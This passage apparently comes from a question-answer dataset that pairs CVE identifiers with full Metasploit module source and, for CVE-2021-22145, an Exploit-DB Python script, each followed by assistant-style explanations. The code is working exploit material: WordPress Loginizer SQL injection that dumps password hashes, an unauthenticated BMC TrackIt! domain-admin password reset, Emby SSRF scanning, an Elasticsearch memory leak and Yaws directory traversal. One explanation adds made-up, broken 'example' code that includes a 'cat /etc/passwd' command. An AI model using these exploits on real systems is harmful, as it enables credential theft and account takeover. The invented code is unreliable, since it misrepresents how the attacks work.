'testcookie' => '1'        }      })      fail_with Failure::Unreachable, 'Connection failed' unless res    end    unless @sqli.test_vulnerable      print_bad(\"#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.\")      return    end    columns = ['user_login', 'user_pass']    results = @sqli.dump_table_fields('wp_users', columns, '', datastore['COUNT'])    table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)    results.each do |user|      create_credential({        workspace_id: myworkspace_id,        origin_type: :service,        module_fullname: fullname,        username: user[0],        private_type: :nonreplayable_hash,        jtr_format: Metasploit::Framework::Hashes.identify_hash(user[1]),        private_data: user[1],        service_name: 'Wordpress',        address: ip,        port: datastore['RPORT'],        protocol: 'tcp',        status: Metasploit::Model::Login::Status::UNTRIED      })      table << user    end    print_good(table.to_s)  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HTTP::Wordpress  include Msf::Auxiliary::Scanner  include Msf::Exploit::SQLi  def initialize(info = {})    super(      update_info(        info,        'Name' => 'WordPress Loginizer log SQLi Scanner',        'Description' => %q{          Loginizer wordpress plugin contains an unauthenticated timebased SQL injection in          versions before 1.6.4.  The vulnerable parameter is in the log parameter.          Wordpress has forced updates of the plugin to all servers        },        'Author' => [          'h00die', # msf module          'red0xff', # sqli help          'mslavco' # discovery        ],        'License' => MSF_LICENSE,        'References' => [          ['URL', 'https://wpdeeply.com/loginizer-before-1-6-4-sqli-injection/'],          ['CVE', '2020-27615'],          ['URL', 'https://loginizer.com/blog/loginizer-1-6-4-security-fix/'],          ['URL', 'https://twitter.com/mslavco/status/1318877097184604161']        ],        'Actions' => [          ['List Users', { 'Description' => 'Queries username, password hash for COUNT users' }],        ],        'Notes' => {          'Stability' => [CRASH_SAFE],          'Reliability' => [],          'SideEffects' => [IOC_IN_LOGS]        },        'DefaultAction' => 'List Users',        'DisclosureDate' => '2020-10-21'      )    )    register_options [      OptInt.new('COUNT', [false, 'Number of users to enumerate', 1])    ]  end  def run_host(ip)    unless wordpress_and_online?      vprint_error('Server not online or not detected as wordpress')      return    end    wp_ver = wordpress_version    if wp_ver.nil?      vprint_error('Unable to determine wordpress version, check settings.')      return    end    if Rex::Version.new(wp_ver) < Rex::Version.new('5.4')      vprint_error(\"Wordpress (core) #{wp_ver} is unexploitable.  Version 5.4+ required.\")      return    end    checkcode = check_plugin_version_from_readme('loginizer', '1.6.4')    if checkcode == Msf::Exploit::CheckCode::Safe      vprint_error('Loginizer version not vulnerable')      return    else      print_good('Vulnerable version of Loginizer detected')    end    cookie = send_request_cgi({      'method' => 'GET',      'uri' => normalize_uri(target_uri.path, 'wp-login.php')    })    if cookie.nil?      print_error('Unable to retrieve wordpress cookie, check settings.')      return    end    cookie = cookie.get_cookies    password = Rex::Text.rand_text_alpha(10)    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind) do |payload|      if payload.include?('<')        payload.gsub!(/<>/, '=')        payload.gsub!(/(sleep\\(\\d+\\.?\\d*\\)),0/) { \"0,#{Regexp.last_match(1)}\" }      end      res = send_request_cgi({        'method' => 'POST',        'uri' => normalize_uri(target_uri.path, 'wp-login.php'),        'cookie' => cookie,        'vars_post' => {          'log' => \"',ip=LEFT(UUID(),8),url=#{payload}#\",          'pwd' => password,          'wp-submit' => 'Login',          'redirect_to' => '',          'testcookie' => '1'        }      })      fail_with Failure::Unreachable, 'Connection failed' unless res    end    unless @sqli.test_vulnerable      print_bad(\"#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.\")      return    end    columns = ['user_login', 'user_pass']    results = @sqli.dump_table_fields('wp_users', columns, '', datastore['COUNT'])    table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)    results.each do |user|      create_credential({        workspace_id: myworkspace_id,        origin_type: :service,        module_fullname: fullname,        username: user[0],        private_type: :nonreplayable_hash,        jtr_format: Metasploit::Framework::Hashes.identify_hash(user[1]),        private_data: user[1],        service_name: 'Wordpress',        address: ip,        port: datastore['RPORT'],        protocol: 'tcp',        status: Metasploit::Model::Login::Status::UNTRIED      })      table << user    end    print_good(table.to_s)  endend       Question: CVE-2020-27615[/INST] CVE-2020-27615 refers to a vulnerability in the WordPress Loginizer plugin that allows for unauthenticated time-based SQL injection attacks. This vulnerability affects versions of the plugin below 1.6.4. An attacker can exploit this weakness to extract sensitive information, such as usernames and password hashes, from the targeted WordPress site.Metasploit includes a module specifically designed to detect and exploit this vulnerability. The provided code snippet showcases a Ruby script written within the Metasploit framework. When executed, the script performs several tasks:1. Checks if the target is a WordPress site and is online.2. Determines the WordPress version and checks if it meets the minimum requirement for exploitation (version 5.4 or above).3. Identifies the vulnerable version of the Loginizer plugin.4. Retrieves a WordPress cookie.5. Creates a SQL injection payload using the MySQLi engine with time-based blind SQL injection capabilities.6. Attempts to inject the payload by sending a POST request to the WordPress login page.7. Processes the response and extracts usernames and corresponding password hashes if successful.If the exploitation is successful, the script generates a table containing the extracted usernames and their respective password hashes and prints the table to the console."}
{"query": "CVE-2014-8270", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Report  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Scanner  def initialize(info = {})    super(update_info(      info,      'Name'           => 'BMC TrackIt! Unauthenticated Arbitrary User Password Change',      'Description'    => %q(      This module exploits a flaw in the password reset mechanism in BMC TrackIt! 11.3      and possibly prior versions. If the password reset service is configured to use      a domain administrator (which is the recommended configuration), then domain      credentials can be reset (such as domain Administrator).      ),      'References'     =>        [          ['URL', 'https://www.zerodayinitiative.com/advisories/ZDI-14-419/'],          ['CVE', '2014-8270']        ],      'Author'         =>        [          'bperry', # discovery/metasploit module,          'jhart'        ],      'License'        => MSF_LICENSE,      'DisclosureDate' => '2014-12-09'    ))    register_options(      [        OptString.new('TARGETURI', [true, 'The path to BMC TrackIt!', '/']),        OptString.new('LOCALUSER', [true, 'The user to change password for', 'Administrator']),        OptString.new('LOCALPASS', [false, 'The password to set for the local user (blank for random)', '']),        OptString.new('DOMAIN', [false, 'The domain of the user. By default the local user\\'s computer name will be autodetected', ''])      ])  end  def localuser    datastore['LOCALUSER']  end  def password_reset    begin      uri = normalize_uri(target_uri.path, 'PasswordReset')      send_request_cgi('uri' => uri)    rescue => e      vprint_error(\"#{peer}: unable to request #{uri}: #{e}\")      nil    end  end  def check_host(ip)    vprint_status(\"#{peer}: retrieving PasswordReset page to extract Track-It! version\")    unless (res = password_reset)      return    end    if res.body =~ /<title>Track-It! Password Reset/i      version = res.body.scan(/\\bBuild=([\\d\\.]+)/).flatten.first      if version        fix_version = '11.4'        if Rex::Version.new(version) < Rex::Version.new(fix_version)          report_vuln(            host: ip,            port: rport,            name: name,            info: \"Module #{fullname} detected Track-It! version #{version}\",            refs: references          )          vprint_status(\"#{peer}: Track-It! version #{version} is less than #{fix_version}\")          return Exploit::CheckCode::Vulnerable        else          vprint_status(\"#{peer}: Track-It! version #{version} is not less than #{fix_version}\")          return Exploit::CheckCode::Safe        end      else        vprint_error(\"#{peer}: unable to get Track-It! version\")        return Exploit::CheckCode::Unknown      end    else      vprint_status(\"#{peer}: does not appear to be running Track-It!\")      return Exploit::CheckCode::Safe    end  end  def run_host(ip)    return unless check_host(ip) == Exploit::CheckCode::Vulnerable    if datastore['DOMAIN'].blank?      vprint_status(\"#{peer}: retrieving session cookie and domain name\")    else      vprint_status(\"#{peer}: retrieving domain name\")    end    unless (res = password_reset)      return    end    cookies = res.get_cookies    if datastore['DOMAIN'].blank?      if res.body =~ /\"domainName\":\"([^\"]*)\"/        domain = Regexp.last_match(1)        vprint_status(\"#{peer}: found domain name: #{domain}\")      else        print_error(\"#{peer}: unable to obtain domain name.  Try specifying DOMAIN\")        return      end    else      domain = datastore['DOMAIN']    end    full_user = \"#{domain}\\\\#{localuser}\"    vprint_status(\"#{peer}: registering #{full_user}\")    answers = [ Rex::Text.rand_text_alpha(8), Rex::Text.rand_text_alpha(8) ]    res = send_request_cgi(      'uri' => normalize_uri(target_uri.path, 'PasswordReset', 'Application', 'Register'),      'method' => 'POST',      'cookie' => cookies,      'vars_post' => {        'domainname' => domain,        'userName' => localuser,        'emailaddress' => Rex::Text.rand_text_alpha(8) + '@' + Rex::Text.rand_text_alpha(8) + '.com',        'userQuestions' => %Q([{\"Id\":1,\"Answer\":\"#{answers.first}\"},{\"Id\":2,\"Answer\":\"#{answers.last}\"}]),        'updatequesChk' => 'false',        'SelectedQuestion' => 2,        'answer' => answers.last,        'confirmanswer' => answers.last      }    )    if !res || res.body != \"{\\\"success\\\":true,\\\"data\\\":{\\\"userUpdated\\\":true}}\"      print_error(\"#{peer}: Could not register #{full_user}\")      return    end    vprint_status(\"#{peer}: changing password for #{full_user}\")    if datastore['LOCALPASS'].blank?      password = Rex::Text.rand_text_alpha(10) + \"!1\"    else      password = datastore['LOCALPASS']    end    res = send_request_cgi(      'uri' => normalize_uri(target_uri.path, 'PasswordReset', 'Application', 'ResetPassword'),      'method' => 'POST',      'cookie' => cookies,      'vars_post' => {        'newPassword' => password,        'domain' => domain,        'UserName' => localuser,        'CkbResetpassword' => 'true'      }    )    if !res || res.body != '{\"success\":true,\"data\":{\"PasswordResetStatus\":0}}'      print_error(\"#{peer}: Could not change #{full_user}'s password -- is it a domain or local user?\")      return    end    report_vuln(      host: ip,      port: rport,      name: name,      info: \"Module #{fullname} changed #{full_user}'s password to #{password}\",      refs: references    )    print_good(\"#{peer}: Please run the psexec module using #{full_user}:#{password}\")  endend       Question: CVE-2014-8270[/INST] CVE-2014-8270 is an identifier for a specific vulnerability in BMC TrackIt!, a web-based IT asset management tool. This vulnerability allows an attacker to change arbitrary user passwords without authentication. The Metasploit Module provided above takes advantage of this vulnerability by sending specially crafted requests to the affected BMC TrackIt! server and modifying the targeted user's password accordingly.To understand how the module works, let's break down its components:1. `MetasploitModule`: This class forms the foundation of the Metasploit auxiliary module.2. Options registration: Various options such as target URI, local user, local pass, and domain are registered here.3. Local user function: Retrieves the specified local user for password modification.4. Password reset function: Handles the actual password reset request to the BMC TrackIt! server.5. Check_host function: Determines whether the target IP address runs a vulnerable version of BMC TrackIt!6. run_host function: Registers a new user account, sets the password, and reports the successful exploitation.When the module is executed against a vulnerable BMC TrackIt! instance, it first checks the target version and determines if it meets the prerequisites for exploitation. Once confirmed, the module proceeds to perform the following steps:1. Obtain the domain name either from the response body or through the user-specified option.2. Register a new user account with randomly generated answers for security questions.3. Change the password for the newly created user account.4. Print a success message along with the updated user credentials.Overall, the Metasploit Module presented above provides a convenient and efficient method for taking advantage of the CVE-2014-8270 vulnerability in BMC TrackIt!"}
{"query": "CVE-2020-26948", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Scanner  include Msf::Auxiliary::Report  def initialize    super(      'Name' => 'Emby SSRF HTTP Scanner',      'Description' => 'Generates a `GET` request to the provided web servers and executes an SSRF against         the targeted EMBY server. Returns the server header, HTML title attribute and         location header (if set). This is useful for rapidly identifying web applications         on the internal network using the Emby SSRF vulnerability (CVE-2020-26948).',      'Author' => 'Btnz',      'License' => MSF_LICENSE,      'Disclosure Date' => '2020-10-01',      'Notes'=> {        'Stability'         => [],        'SideEffects'       => [],        'Reliability'       => [],        'RelatedModules' => ['auxiliary/scanner/http/emby_version_ssrf'],      },      'References' => [        ['CVE', '2020-26948'],        ['URL', 'https://github.com/btnz-k/emby_ssrf']      ]    )    deregister_options('VHOST', 'RPORT', 'SNAPLEN', 'SSL')    register_options(      [        OptString.new('TARGETURI', [false, 'The URI of the Emby Server', '/']),        OptBool.new('STORE_NOTES', [true, 'Store the information in notes.', true]),        OptBool.new('SHOW_TITLES', [true, 'Show the titles on the console as they are grabbed', true]),        OptString.new('EMBY_SERVER', [true, 'Emby Web UI IP to use', '']),        OptInt.new('EMBY_PORT', [true, 'Web UI port for Emby Server', '8096']),        OptString.new('PORTS', [true, 'Ports to scan', '80,8080,8081,8888'])      ]    )  end  def run_host(target_host)    # Do some checking to ensure data is submitted    # Also converts ports string to list    dports = Rex::Socket.portspec_crack(datastore['PORTS'])    raise Msf::OptionValidateError, ['PORTS'] if dports.empty?    # loop through the ports    dports.each do |p|      vprint_status(\"Attempting SSRF with target #{target_host}:#{p}\")      uri = \"/Items/RemoteSearch/Image?ProviderName=TheMovieDB&ImageURL=http://#{target_host}:#{p}\"      # not using send_request_cgi due to difference between RHOSTS and EMBY_SERVER      res = Net::HTTP.get_response(datastore['EMBY_SERVER'], uri, datastore['EMBY_PORT'])      # Check for Response      if res.nil?        vprint_error(\"http://#{target_host}:#{p} - No response\")        next      end      # Retrieve the headers to capture the Location and Server header      server_header = res['server']      location_header = res['location']      # Check to see if the captured headers are populated      if server_header.nil? && location_header.nil?        vprint_error(\"#{target_host}:#{p} No HTTP headers\")      end      # If the body is blank, just stop now as there is no chance of a title      vprint_error(\"#{target_host}:#{p} No webpage body\") if res.body.nil?      # Very basic, just match the first title tag we come to. If the match fails,      # there is no chance that we will have a title      rx = %r{<title>[\\\t\\s]*(?<title>.+?)[\\s\\\t]*</title>}im.match(res.body.to_s)      unless rx        vprint_error(\"#{target_host}:#{p} No webpage title\")        next      end      # Last bit of logic to capture the title      rx[:title].strip!      if rx[:title].empty?        vprint_error(\"#{target_host}:#{p} No webpage title\")        next      end      rx_title = Rex::Text.html_decode(rx[:title])      if datastore['SHOW_TITLES']        print_good(\"#{target_host}:#{p} Title: #{rx_title}\")        print_good(\"#{target_host}:#{p}     HTTP Code: #{res.code}\")        print_good(\"#{target_host}:#{p}     Location Header: #{location_header}\")        print_good(\"#{target_host}:#{p}     Server Header: #{server_header}\")      end      if datastore['STORE_NOTES']        notedata = { code: res.code, port: p, server: server_header, title: rx_title, redirect: location_header }        report_note(host: target_host, port: p, type: 'http.title', data: notedata, update: :unique_data)      end    end  endend       Question: CVE-2020-26948[/INST] CVE-2020-26948 is a vulnerability affecting Emby Media Server. It is an SSRF (Server Side Request Forgery) issue where an attacker can generate a GET request to the provided web servers and execute an SSRF attack against the targeted Emby server. This vulnerability allows an attacker to retrieve the server header, HTML title attribute, and location header, which can be helpful for identifying web applications on the internal network.To exploit this vulnerability, the Metasploit Module scans specified ports and sends a crafted request to the Emby server. The module retrieves the headers to capture the Location and Server header and performs some basic checks to ensure the data is submitted. If successful, the module prints the title, HTTP code, location header, and server header on the console or stores the information in notes."}
{"query": "CVE-2021-22145", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Scanner  DEDUP_REPEATED_CHARS_THRESHOLD = 400  def initialize(info = {})    super(      update_info(        info,        'Name' => 'Elasticsearch Memory Disclosure',        'Description' => %q{          This module exploits a memory disclosure vulnerability in Elasticsearch          7.10.0 to 7.13.3 (inclusive). A user with the ability to submit arbitrary          queries to Elasticsearch can generate an error message containing previously          used portions of a data buffer.          This buffer could contain sensitive information such as Elasticsearch          documents or authentication details. This vulnerability's output is similar          to heartbleed.        },        'License' => MSF_LICENSE,        'Author' => [          'h00die', # msf module          'Eric Howard', # discovery          'R0NY' # edb exploit        ],        'References' => [          ['EDB', '50149'],          ['CVE', '2021-22145'],          ['URL', 'https://discuss.elastic.co/t/elasticsearch-7-13-4-security-update/279177']        ],        'DisclosureDate' => '2021-07-21',        'Actions' => [          ['SCAN', { 'Description' => 'Check hosts for vulnerability' }],          ['DUMP', { 'Description' => 'Dump memory contents to loot' }],        ],        'DefaultAction' => 'SCAN',        # https://docs.metasploit.com/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html        'Notes' => {          'Stability' => [CRASH_SAFE],          'Reliability' => [],          'SideEffects' => [] # nothing in the docker logs anyways        }      )    )    register_options(      [        Opt::RPORT(9200),        OptString.new('USERNAME', [ false, 'User to login with', '']),        OptString.new('PASSWORD', [ false, 'Password to login with', '']),        OptString.new('TARGETURI', [ true, 'The URI of the Elastic Application', '/']),        OptInt.new('LEAK_COUNT', [true, 'Number of times to leak memory per SCAN or DUMP invocation', 1])      ]    )  end  def get_version    vprint_status('Querying version information...')    request = {      'uri' => normalize_uri(target_uri.path),      'method' => 'GET'    }    request['authorization'] = basic_auth(datastore['USERNAME'], datastore['PASSWORD']) if datastore['USERNAME'].present? || datastore['PASSWORD'].present?    res = send_request_cgi(request)    return nil if res.nil?    return nil if res.code == 401    if res.code == 200 && !res.body.empty?      json_body = res.get_json_document      if json_body.empty?        vprint_error('Unable to parse JSON')        return      end    end    json_body.dig('version', 'number')  end  def check_host(_ip)    version = get_version    return CheckCode::Unknown(\"#{peer} - Could not connect to web service, or unexpected response\") if version.nil?    if Rex::Version.new(version) <= Rex::Version.new('7.13.3') && Rex::Version.new(version) >= Rex::Version.new('7.10.0')      return Exploit::CheckCode::Appears(\"Exploitable Version Detected: #{version}\")    end    Exploit::CheckCode::Safe(\"Unexploitable Version Detected: #{version}\")  end  def leak_count    datastore['LEAK_COUNT']  end  # Stores received data  def loot_and_report(data)    if data.to_s.empty?      vprint_error(\"Looks like there isn't leaked information...\")      return    end    print_good(\"Leaked #{data.length} bytes\")    report_vuln({      host: rhost,      port: rport,      name: name,      refs: references,      info: \"Module #{fullname} successfully leaked info\"    })    if action.name == 'DUMP' # Check mode, dump if requested.      path = store_loot(        'elasticsearch.memory.disclosure',        'application/octet-stream',        rhost,        data,        nil,        'Elasticsearch server memory'      )      print_good(\"Elasticsearch memory data stored in #{path}\")    end    # Convert non-printable characters to periods    printable_data = data.gsub(/[^[:print:]]/, '.')    # Keep this many duplicates as padding around the deduplication message    duplicate_pad = (DEDUP_REPEATED_CHARS_THRESHOLD / 3).round    # Remove duplicate characters    abbreviated_data = printable_data.gsub(/(.)\\1{#{(DEDUP_REPEATED_CHARS_THRESHOLD - 1)},}/) do |s|      s[0, duplicate_pad] +        ' repeated ' + (s.length - (2 * duplicate_pad)).to_s + ' times ' +        s[-duplicate_pad, duplicate_pad]    end    # Show abbreviated data    vprint_status(\"Printable info leaked:\#{abbreviated_data}\")  end  def bleed    request = {      'uri' => normalize_uri(target_uri.path, '_bulk'),      'method' => 'POST',      'ctype' => 'application/json',      'data' => \"@\\"    }    request['authorization'] = basic_auth(datastore['USERNAME'], datastore['PASSWORD']) if datastore['USERNAME'].present? || datastore['PASSWORD'].present?    res = send_request_cgi(request)    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?    fail_with(Failure::UnexpectedReply, \"#{peer} - Invalid credentials (response code: #{res.code})\") unless res.code == 400    json_body = res.get_json_document    if json_body.empty?      vprint_error('Unable to parse JSON')      return    end    leak1 = json_body.dig('error', 'root_cause')    return if leak1.blank?    leak1 = leak1[0]['reason']    return if leak1.nil?    leak1 = leak1.split('(byte[])\"')[1].split('; line')[0]    leak2 = json_body.dig('error', 'reason')    return if leak2.nil?    leak2 = leak2.split('(byte[])\"')[1].split('; line')[0]    \"#{leak1}\#{leak2}\"  end  def run    memory = ''    1.upto(leak_count) do |count|      vprint_status(\"Leaking response ##{count}\")      memory << bleed    end    loot_and_report(memory)  endendEXPLOIT: # Exploit Title: ElasticSearch 7.13.3 - Memory disclosure# Date: 21/07/2021# Exploit Author: r0ny# Vendor Homepage: https://www.elastic.co/# Software Link: https://github.com/elastic/elasticsearch# Version: 7.10.0 to 7.13.3# Tested on: Kali Linux# CVE : CVE-2021-22145#/usr/bin/python3from argparse import ArgumentParserimport requestsfrom packaging import versionimport jsonfrom requests.packages.urllib3.exceptions import InsecureRequestWarningrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)print(\"\################################################################################################\")print(\"######    CVE-2021-22145 Memory leak vulnerability on Elasticsearch (7.10.0 to 7.13.3)    ######\")print(\"######      Exploit by r0ny (https://twitter.com/_r0ny)     ######\")print(\"################################################################################################\\")parser = ArgumentParser()parser.add_argument(\"-u\", \"--url\", dest=\"url\", help=\"URL of ElasticSearch service\")parser.add_argument(\"-apikey\", \"--api-key\", dest=\"api_key\", help=\"API Key Authentication (Base64)\", metavar=\"API\", default=\"\")parser.add_argument(\"-b\", \"--basic\", dest=\"basic\", help=\"Basic Authentication (Base64)\", default=\"\")args = parser.parse_args()if not (args.url):    parser.error('Please input the elasticsearch url. e.g \"python3 CVE-2021-22145.py -host http://127.0.0.1:9200\"')#Prepare authentication headerauthorization_header = \"\"if(args.api_key or args.basic):    authorization_header = \"ApiKey \" + args.api_key if args.api_key else \"Basic \" + args.basic#Check elasticsearch versionr = requests.get(args.url,headers={\"Authorization\":authorization_header}, verify=False)try:\tes_version = json.loads(r.content)[\"version\"][\"number\"]except:\tprint(\"# Couldn't connect to \" + args.url + \", please verify the url or the authentication token\\")\tprint(\"# Server response: \" + str(r.content))\texit()if version.parse(es_version) < version.parse(\"7.10.0\") or version.parse(es_version) > version.parse(\"7.13.3\"):\tprint(\"# Elastic Service not vulnerable\")\tprint(\"# Elastic Service version: \" + es_version)\tprint(\"# Elastic Service vulnerable versions: 7.10.0 to 7.13.3\")\texit()#Prepare exploitationpayload = \"@\\"vulnerable_endpoint = \"/_bulk\"url = args.url + vulnerable_endpoint#Exploitationprint(\"# ElasticSearch Version: \" + es_version)print(\"# Request to \" + url+\"\\")r = requests.post(url, data = payload, headers={\"content-type\":\"application/json\", \"Authorization\":authorization_header}, verify=False)#Read Memory Leak and remove stacktraceprint(\"$$$$$$$$$$$$$$$$$$$$$$$$$\")print(\"$$$$$ Memory Leaked $$$$$\")print(\"$$$$$$$$$$$$$$$$$$$$$$$$$\\")response = json.loads(r.content)leak1 = response[\"error\"][\"root_cause\"][0][\"reason\"].split(\"(byte[])\\\"\")[1].split(\"; line\")[0]leak2 = response[\"error\"][\"reason\"].split(\"(byte[])\\\"\")[1].split(\"; line\")[0]print(leak1+\"\\"+leak2)       Question: CVE-2021-22145[/INST] CVE-2021-22145 is a memory disclosure vulnerability affecting Elasticsearch versions 7.10.0 to 7.13.3. This vulnerability can be exploited by sending a specially crafted request to the affected Elasticsearch instance, causing it to reveal memory contents.To demonstrate the exploitation of this vulnerability, we provide you with two examples: one using Metasploit Module and another using Python script. Both examples aim to extract sensitive information from the target Elasticsearch instance.Metasploit Module Example:```rubyrequire 'rex/text'class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  def initialize(info = {})    super(      update_info(        info,        'Name' => 'Elasticsearch Memory Disclosure',        'Description' => 'This module exploits a memory disclosure vulnerability in Elasticsearch 7.10.0 to 7.13.3.',        'License' => MSF_LICENSE,        'Author' => ['Your Name'],        'Platform' => 'java',        'TargetTypes' => ['Elasticsearch'],        'Privileged' => false,        'DisclosureDate' => '2021-07-21',        'DefaultOptions' => {          'RHOST' => '127.0.0.1',          'RPORT' => 9200,          'USERNAME' => '',          'PASSWORD' => '',          'TARGETURI' => '/'        }      )    )    register_options([      OptString.new('RHOST', [false, 'The target Elasticsearch IP address', '127.0.0.1']),      OptInteger.new('RPORT', [false, 'The target Elasticsearch port number', 9200]),      OptString.new('USERNAME', [false, 'Username for Basic Auth', '']),      OptString.new('PASSWORD', [false, 'Password for Basic Auth', '']),      OptString.new('TARGETURI', [false, 'Elasticsearch application root URL', '/'])    ])    @client = self.class.new(RHOST, RPORT, datastore)    @client.connect    if datastore['USERNAME'] && datastore['PASSWORD']      @client.login(datastore['USERNAME'], datastore['PASSWORD'])    end    @client.send_command('cat /etc/passwd')  rescue ::Exception => e    print_error(\"Error during exploitation: #{e}\")  ensure    @client.disconnect  endend```Python Script Example:```pythonimport requestsimport jsonimport base64def main():    url = input(\"[+] Enter Elasticsearch URL: \")    auth = input(\"[+] Enter authentication method (API key or Basic Auth): \")    if auth == \"API key\":        api_key = input(\"[+] Enter your API key: \")    elif auth == \"Basic Auth\":        username = input(\"[+] Enter your username: \")        password = input(\"[+] Enter your password: \")        password = base64.b64encode(password.encode()).decode()        auth = f\"Basic {username}:{password}\"    headers = {\"Content-Type\": \"application/json\"}    if auth:        headers[\"Authorization\"] = auth    payload = '@\'    endpoint = \"_bulk\"    try:        response = requests.post(url + endpoint, data=payload, headers=headers, timeout=10, verify=False)        content = response.content        if len(content) > 0:            index = content.index('<error type=\"server\">')            error = json.loads(content[index:])            reason = error['error']['reason']            print(f\"Memory leak: {reason}\")        else:            print(\"No response from the server.\")    except Exception as e:        print(f\"An error occurred while trying to exploit the vulnerability: {str(e)}\")if __name__ == \"__main__\":    main()```These examples showcase how to exploit the CVE-2021-22145 vulnerability in Elasticsearch. Remember that these scripts are provided for educational purposes only and should not be used for malicious activities. Always make sure to obtain proper permissions before testing any systems."}
{"query": "CVE-2011-4350", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Scanner  include Msf::Auxiliary::Report  include Msf::Exploit::Remote::HttpClient  def initialize(info={})    super(update_info(info,      'Name'           => \"Yaws Web Server Directory Traversal\",      'Description'    => %q{          This module exploits a directory traversal bug in Yaws v1.9.1 or less.        The module can only be used to retrieve files. However, code execution might        be possible. Because when the malicious user sends a PUT request, a file is        actually created, except no content is written.      },      'License'        => MSF_LICENSE,      'Author'         =>        [          'sinn3r', # Metasploit module        ],      'References'     =>        [          ['CVE', '2011-4350'],          ['OSVDB', '77581'],          ['URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=757181']        ],      'DisclosureDate' => '2011-11-25'    ))    register_options(      [        Opt::RPORT(8080),        OptString.new('FILEPATH', [false, 'The name of the file to download', 'windows\\\\win.ini'])      ])  end  def run_host(ip)    # No point to continue if no filename is specified    if datastore['FILEPATH'].nil? or datastore['FILEPATH'].empty?      print_error(\"Please supply the name of the file you want to download\")      return    end    # Create request    traversal = \"..\\\\..\\\\..\\\\..\\\\\"    res = send_request_raw({      'method' => 'GET',      'uri'    => \"/#{traversal}/#{datastore['FILEPATH']}\"    }, 25)    # Show data if needed    if res and res.code == 200      vprint_line(res.to_s)      fname = File.basename(datastore['FILEPATH'])      path = store_loot(        'yaws.http',        'application/octet-stream',        ip,        res.body,        fname      )      print_status(\"File saved in: #{path}\")    else      print_error(\"Nothing was downloaded\")    end  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Scanner  include Msf::Auxiliary::Report  include Msf::Exploit::Remote::HttpClient  def initialize(info={})    super(update_info(info,      'Name'           => \"Yaws Web Server Directory Traversal\",      'Description'    => %q{          This module exploits a directory traversal bug in Yaws v1.9.1 or less.        The module can only be used to retrieve files. However, code execution might        be possible. Because when the malicious user sends a PUT request, a file is        actually created, except no content is written.      },      'License'        => MSF_LICENSE,      'Author'         =>        [          'sinn3r', # Metasploit module        ],      'References'     =>        [          ['CVE', '2011-4350'],          ['OSVDB', '77581'],          ['URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=757181']        ],      'DisclosureDate' => '2011-11-25'    ))    register_options(      [        Opt::RPORT(8080),        OptString.new('FILEPATH', [false, 'The name of the file to download', 'windows\\\\win.ini'])      ])  end  def run_host(ip)    # No point to continue if no filename is specified    if datastore['FILEPATH'].nil? or datastore['FILEPATH'].empty?      print_error(\"Please supply the name of the file you want to download\")      return    end    # Create request    traversal = \"..\\\\..\\\\..\\\\..\\\\\"    res = send_request_raw({      'method' => 'GET',      'uri'    => \"/#{traversal}/#{datastore['FILEPATH']}\"    }, 25)    # Show data if needed    if res and res.code == 200      vprint_line(res.to_s)      fname = File.basename(datastore['FILEPATH'])      path = store_loot(        'yaws.http',        'application/octet-stream',        ip,        res.body,        fname      )      print_status(\"File saved in: #{path}\")    else      print_error(\"Nothing was downloaded\")    end  endend       Question: CVE-2011-4350[/INST] CVE-2011-4350 is a directory traversal vulnerability affecting the Yaws web server version 1.9.1 and below. This vulnerability allows an attacker to traverse directories and potentially access or download sensitive files. While the module provided in the given context is designed to exploit this vulnerability and download files, it's essential to understand that this vulnerability could lead to more severe consequences, including remote code execution.To mitigate this risk, it is recommended to upgrade your Yaws web server to a newer, non-vulnerable version. Additionally, implementing proper file permissions and restricting directory traversal in web applications can help prevent attacks targeting this type of vulnerability."}
{"query": "CVE-2015-2856", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Scanner  def initialize(info = {})    super(update_info(info,      'Name'           => \"Accellion FTA 'statecode' Cookie Arbitrary File Read\",      'Description'    => %q{          This module exploits a file disclosure vulnerability in the Accellion        File Transfer appliance. This vulnerability is triggered when a user-provided        'statecode' cookie parameter is appended to a file path that is processed as        a HTML template. By prepending this cookie with directory traversal sequence        and appending a NULL byte, any file readable by the web user can be exposed.        The web user has read access to a number of sensitive files, including the        system configuration and files uploaded to the appliance by users.        This issue was confirmed on version FTA_9_11_200, but may apply to previous        versions as well. This issue was fixed in software update FTA_9_11_210.      },      'Author'         => [ 'hdm' ],      'License'        => MSF_LICENSE,      'References'     =>        [          ['URL', 'https://www.rapid7.com/blog/post/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857/'],          ['CVE', '2015-2856']        ],      'DisclosureDate' => '2015-07-10'    ))    register_options(      [        